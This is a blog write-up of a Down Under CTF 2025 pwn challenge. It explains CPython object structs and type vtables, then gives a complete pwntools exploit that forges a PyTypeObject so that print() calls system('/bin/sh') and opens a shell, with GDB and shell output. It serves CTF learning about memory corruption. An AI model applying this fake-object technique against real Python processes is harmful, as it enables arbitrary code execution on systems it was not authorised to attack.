---
title: 'An Introduction to Python Pwn: DUCTF 2025'
date: '2025-07-20T10:40:16-04:00'
tags: ["binex", "concepts"]
author: "AmeliaYeah"
draft: false
table-of-contents: true
toc-auto-numbering: true
---

Today, or well, yesterday, I participated in the *Down Under CTF* event. As someone particularly interested in pwn, I decided to take a crack at the category first as usual on my team.

Two challenges, however, really piqued my interest. They involved what I will now be discussing in this post: **binary exploitation against Python3 itself**. Yes, you heard that right.

## How does Python work..really?

As you may or may not know, interpreted languages like Javascript, Ruby, Python, whatever, are fundementally just a low-level binary reading off your text and executing it. It will make it easier on itself by using things like bytecode, but that's basically the heart of what it's doing.

In Python particularly, the actual root, [CPython](https://github.com/python/cpython/tree/v3.10.12/Python), is a C codebase that executes all python3 scripts.

**DISCLAIMER:** In this post I will be covering `Python v3.10.12`, as this is what was used in the CTF. **The codebase of the C Python API can vary heavily from version-to-version, so while the general fundementals should remain true, the actual implementations will not always be the same!**

### Variables and PyObjects

Whenever you define an object (even primitives), the object will be created by being some form of struct in memory. It usually extends the [PyObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Include/object.h#L105) struct, but can also extend [PyVarObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Include/object.h#L115) if it is some object involving length (think of lists for example).

```c
typedef struct _object {
    _PyObject_HEAD_EXTRA //doesn't matter here, ignore this
    Py_ssize_t ob_refcnt;
    PyTypeObject *ob_type;
} PyObject;

typedef struct {
    PyObject ob_base;
    Py_ssize_t ob_size; /* Number of items in variable part */
} PyVarObject;
```

The notion of inheritance, using a [PyListObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Include/cpython/listobject.h#L5) for example, is shown here:

```c
typedef struct {
    PyVarObject ob_base { //PyVarObject also extends from PyObject
    	PyObject ob_base;
    	Py_ssize_t ob_size;
    }
    PyObject **ob_item;
    Py_ssize_t allocated;
} PyListObject;
```

Some examples of Python types and their specific structs:
* Dictionaries have [PyDictObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Include/cpython/dictobject.h#L10)
* Tuples have [PyTupleObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Include/cpython/tupleobject.h#L5)
* Strings have [PyUnicodeObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Include/cpython/unicodeobject.h#L236)
* Floats have [PyFloatObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Include/floatobject.h#L15)
* Exetra, usually it will be pretty straightforward to find the struct name from the type.

### PyObjects and PyTypeObjects

You may have noticed, in the `PyObject` type, there existed 2 fields in this version:

```c
typedef struct _object {
    Py_ssize_t ob_refcnt;
    PyTypeObject *ob_type;
} PyObject;
```

The `ob_refcnt` number essentially determines, as per the [documentation](https://docs.python.org/3.10/c-api/typeobj.html#c.PyObject.ob_refcnt), the number of references a `PyObject` has to it for garbage-collection purposes.

The other type, `ob_type`, is more important here. It points to a [PyTypeObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Doc/includes/typestruct.h#L1), which if you are familiar with LibC filestream vtables, basically work the same way. They are the foundation behind the *Object Oriented* design of Python, in a sense.

For instance, say you executed this:

```python3 {script_name="test.py"}
my_dict = {}
my_str = "hello"

hello = str(my_str) + str(my_dict)
print(hello)
```

For execution of `str(my_str)` it's pretty obvious how that would work. Maybe it just returns the string itself since it's already a string, maybe it allocates a new one and copies the string to the new string, who knows.

However, when running `str(my_dict)`, even without knowledge of CPython and python internals, it's pretty obvious that it's not doing the same thing *at all* compared to a simple character array.

The reason this works is because, again, the type object and the functions it points to are what actually handle everything. The function pointer pointed to in the `tp_str` field for a String type is going to be different compared to that of a Dictionary type, but will ultimately result in the object being turned into a string.

This same principle applies to alot of other core aspects about a type, which if you are interested, you can read about [in the official documentation](https://docs.python.org/3.10/c-api/typeobj.html).

## Sooo...how do we break it?

It's worth noting that first of all, most of the time, python low-level exploitation isn't really a (practical) concern. It's more of a concern with things like webJS and WASM, since they are much more keyed-into the lower level side of things. If you wanted to be evil, you'll be 100x better off just finding bugs in the source code of Python frameworks (or just attacking vulnerabilities in the script directly).

However, the basic idea and education from this could help in better understanding how real-life JIT *could* (and sometimes do) look like in other languages (like aforementioned WASM and webJS).

### Setup

Firstly, the majority of time spent on these challenges (atleast one of them) was making GDB actually compatible with Python. Luckily, this was pretty easy, but does require pulling python down from scratch.

Here's the setup in order to configure a `Python v3.10.12` install with GDB debugging symbols:

```sh {script_name="install.sh"}
wget 'https://www.python.org/ftp/python/3.10.12/Python-3.10.12.tar.xz'
tar xf Python-3.10.12.tar.xz
cd Python-3.10.12
./configure --with-pydebug
make
```

After this is done, you can then go ahead and execute all the python scripts you want with the built `python` binary. Opening GDB on that built `python` binary (and any script its executing) will allow you access to the GDB debugging features specific to `CPython`.

## FakeObjects

The first, and the only challenge I actually solved of the 2, is going to demonstrate what a *fakeobject* is in JIT. Here is the vulnerable script:

```python3 {script_name="fakeobj.py"}
#!/usr/bin/env python3

import ctypes

obj = {}
print(f"addrof(obj) = {hex(id(obj))}")

libc = ctypes.CDLL(None)
system = ctypes.cast(libc.system, ctypes.c_void_p).value
print(f"system = {hex(system or 0)}")

fakeobj_data = bytes.fromhex(input("fakeobj: "))
for i in range(72):
    ctypes.cast(id(obj), ctypes.POINTER(ctypes.c_char))[i] = fakeobj_data[i]

print(obj)
```

As you can see here, couple of things:
* It allocates an object, and then gives us its ID. Running `id(val)` gives a unique number specific to that object, according to the [documentation](https://docs.python.org/3.10/library/functions.html#id), and it does this by giving the memory address of the `PyObject` struct.
* It gives us the current in-use LibC by the Python process by running `CDLL(None)`, and then gives us a LibC leak by leaking out the address of `system()`
* It asks us for 72 bytes of input, and then manually edits the memory of the `obj` directly with our input
* It executes `print()` on the object after the memory has been modified

It's obvious how this is vulnerable. Writing to an object in python is different on the high level compared to the low level, so this weird mechanic essentially lets us write over the internal struct of the object.

### Exploiting the print() function

Executing `print` in Python really just executes [builtin_print](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Python/bltinmodule.c#L1948) in CPython. The actual printing mechanic is shown here:

```c
for (i = 0; i < nargs; i++) {
	//this handles seperators, not actual objects to print
	if (i > 0) {
		if (sep == NULL)
			err = PyFile_WriteString(" ", file);
		else
			err = PyFile_WriteObject(sep, file, Py_PRINT_RAW);

		if (err)
			return NULL;
	}

	//this handles actually writing each printed object
	err = PyFile_WriteObject(args[i], file, Py_PRINT_RAW);
	if (err)
		return NULL;
}
```

As you can see here, for each argument in the `print` function, it executes [PyFile_WriteObject](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Objects/fileobject.c#L119) on it with the `Py_PRINT_RAW` flag.

This is important, because now look what happens in the `PyFile_WriteObject` function:

```c
if (flags & Py_PRINT_RAW) {
	value = PyObject_Str(v);
}
else
	value = PyObject_Repr(v);
```

You may have already guessed it, but [PyObject_Str](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Objects/object.c#L462) utilizes what we discussed earlier. This time, however, there's one of two ways to go about it. If `tp_str` is NULL, then it will go to the `tp_repr` as a fallback. If it isn't NULL, it will use that instead.

```c
if (Py_TYPE(v)->tp_str == NULL)
    return PyObject_Repr(v); //we can use tp_repr if tp_str is NULL
...
...
res = (*Py_TYPE(v)->tp_str)(v); //or we can just use tp_str if it isn't NULL
```

The [PyObject_Repr](https://github.com/python/cpython/blob/b4e48a444ea02921ce4b701fe165e6cfd4cf5845/Objects/object.c#L409) function is basically the same to the `PyObject_Str` function, just using `tp_repr` instead of `tp_str`

```c
...
res = (*Py_TYPE(v)->tp_repr)(v); //same thing
...
```

In either case, clever modification of either can lead to code execution.

### Exploitation

The goal here is to modify the `PyTypeObject` pointer, to where it points to a fake `PyTypeObject` (see where the challenge name comes from?)

In my exploit, I went ahead and modified `tp_repr` and set `tp_str` to NULL with my remaining write. It's arbitrary as to which function you pick, so modifying `tp_str` instead will also work.

Given our limited write, and the nature of only printing the dictionary and doing nothing else, we don't actually need to worry about the metadata of the dictionary "below" the `PyObject` header. This means we can use one of the fields instead as part of our write, and then position our fake `PyTypeObject` so that the modified field with our function pointer becomes `tp_repr`

```c
typedef struct {
	PyObject ob_base {
		Py_ssize_t ob_refcnt;
    	PyTypeObject *ob_type; //we can change this!
	}

	//we can write over one of these with the system address, then position the pointer so they they're in the correct position for the TypeObject's tp_repr
    Py_ssize_t ma_used;
    uint64_t ma_version_tag;
    PyDictKeysObject *ma_keys;
    PyObject **ma_values;
} PyDictObject;
```

However, in regards to having `system` call specifically with the "/bin/sh" parameter, it is important to note that, as shown before, the print function executes `tp_repr` with the parameter being our `PyObject`.

```c
...
res = (*Py_TYPE(v)->tp_repr)(v); //goal is to have this be system("/bin/sh") instead
...
```

What this means is that:
1. In order to get `system("/bin/sh")` executing, we will need to set the beginning of the struct to the binsh string, so that when our `PyObject` is treated like a `char*` the `system` function will interpret it as running with parameter "/bin/sh". The first field is `ob_refcnt`, so this is the field we'll be modifying.
2. When Python is in the process of executing the print, `ob_refcnt` will be incremented (as it is an integer, not a string). This means that we will need to, as our actual string, use `\x2ebin/sh\x00`. The increment will turn 0x2e into 0x2f (a forward slash), and the null terminator at the end is, obviously, because it is a C string.

Once we have appropriately written our parameter in `ob_refcnt`, we'll then need to figure out what to set `ob_type` to.

We'll first need to get the offset from the object type and the `tp_repr` field:

```as
pwndbg> p PyDict_Type
$2 = {   
	...
	tp_repr = 0x5555555e11c6 <dict_repr>, //the repr function
	...

pwndbg> x/32xg &PyDict_Type
...
0x555555924370 <PyDict_Type+80>:        0x0000000000000000      0x00005555555e11c6 //the repr function is here, 88 (0x58) bytes from the start
...
```

Knowing this, we now know that our pointer should be `addrof(obj) + 16 - 0x58`.
* The address of the object, since we are writing to it
* 16 bytes after, since we wrote `ob_refcnt` (8) and `ob_type` (8)
* 0x58 before, so `ob_type+0x58`, to get `tp_repr`, becomes `ma_used-0x58+0x58`, or just `ma_used`

After we write our pointer, we set the `ma_used` field in the struct to the address of `system`.

### The Exploit Script

```python3 {script_name="exploit.py"}
from pwn import *

#version must be 3.10.12
with process(["dbg_py/python", "fakeobj.py"]) as p:
	#read both the object memory address, and the libc system address
	read_given = lambda: p.recvline().split(b" = ")[1].decode("ascii")[2:]
	pyobj_addr = int(read_given(), 16)
	system = int(read_given(), 16)

	#information
	log.info("Object Address: "+hex(pyobj_addr))
	log.info("System(): "+hex(system))

	#memory address for ob_type in PyObject
	pytypeobj = pyobj_addr+16-88

	#modify struct fields
	fake_obj = b"\x2ebin/sh\x00"
	fake_obj += p64(pytypeobj)
	fake_obj += p64(system) #pytypeobj+0x58 will go here
	fake_obj += b"\x00"*(72-len(fake_obj)) #make everything else NULL, including tp_str

	#send it
	p.sendlineafter(b"fakeobj: ", fake_obj.hex().encode("ascii"))
	p.interactive()
```

```bash
[+] Starting local process 'dbg_py/python': pid 775817
[*] Object Address: 0x7f25d117dc10
[*] System(): 0x7f25d1675050
[*] Switching to interactive mode
$ ls
core    Dockerfile  flag.txt
dbg_py  fakeobj.py  solve.py
```

If you'd like to know more about the other challenge I *didn't* solve, Read-Write, check out the official writeup [here](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/pwn/rw.py/solve/solv.py) if you're interested in getting a bit more technical with this concept.